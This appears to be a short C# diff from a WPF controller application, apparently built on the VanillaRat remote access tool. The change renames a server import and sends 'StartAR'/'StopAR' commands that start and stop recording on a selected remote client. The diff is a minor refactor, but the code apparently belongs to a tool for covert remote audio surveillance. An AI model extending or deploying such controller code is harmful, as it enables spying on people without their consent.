@@ -12,8 +12,8 @@ using System.Windows.Input;
 using System.Windows.Media;
 using System.Windows.Threading;
 using TaskManager.Command;
-using VanillaRat.Classes;
 using WpfAnimatedGif;
+using Serverr = Server.Server;
 using WpfApp15.Model.Program;
 using WpfApp15.Scripts.Other;
 using WpfApp15.ViewModel;
@@ -66,14 +66,14 @@ namespace WpfApp15.Scripts.Model.Program
                 if (!Recording)
                 {
                     SP.Stop();
-                    Server.MainServer.Send(TaskManager.ViewModel.selectedData.Id, Encoding.ASCII.GetBytes("StartAR"));
+                    Serverr.MainServer.Send(TaskManager.ViewModel.selectedData.Id, Encoding.ASCII.GetBytes("StartAR"));
                     Recording = true;
                     IsReady = false;
                     DateTime = DateTime.Now;
                 }
                 else
                 {
-                    Server.MainServer.Send(TaskManager.ViewModel.selectedData.Id, Encoding.ASCII.GetBytes("StopAR"));
+                    Serverr.MainServer.Send(TaskManager.ViewModel.selectedData.Id, Encoding.ASCII.GetBytes("StopAR"));
                     Recording = false;
                     IsReady = true;
                     Time = DateTime.Now.Subtract(DateTime);
